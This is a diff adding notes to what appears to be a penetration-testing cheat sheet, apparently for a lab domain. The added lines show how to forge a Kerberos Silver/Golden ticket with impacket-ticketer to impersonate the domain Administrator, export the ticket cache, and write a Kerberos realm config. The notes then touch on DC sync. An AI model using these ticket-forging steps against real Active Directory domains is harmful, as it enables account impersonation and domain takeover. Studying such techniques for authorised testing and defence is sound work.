@@ -68,6 +68,31 @@
 5. check tickets ```pwsh> klist ```
 6. try access kerberos services: ``` iwr -UseDefaultCredentials http://web04 ```
 
+- Linux (Kali way)
+1. Impersonate Administrator via Silver Ticket (w/ service account):
+2. Silver/Golden ticket ``` impacket-ticketer -nthash {nthash} -domain-sid {domain-sid} -domain nagoya-industries.com -spn {spn} -user-id 500 Administrator ```
+3. get env var: ``` export KRB5CCNAME=$PWD/Administrator.ccache ```
+4. Create file under /etc/brb5user.conf
+   ```
+    [libdefaults]
+            default_realm = NAGOYA-INDUSTRIES.COM
+            kdc_timesync = 1
+            ccache_type = 4
+            forwardable = true
+            proxiable = true
+        rdns = false
+        dns_canonicalize_hostname = false
+            fcc-mit-ticketflags = true
+
+    [realms]        
+            NAGOYA-INDUSTRIES.COM = {
+                    kdc = nagoya.nagoya-industries.com
+            }
+
+    [domain_realm]
+            .nagoya-industries.com = NAGOYA-INDUSTRIES.COM
+    ```
+
 ## Domain Controller Sync
 - Only works in sync turned on DC (Production real world will have)
 - Requires DC admin ( Replicating Directory Changes Permissions )
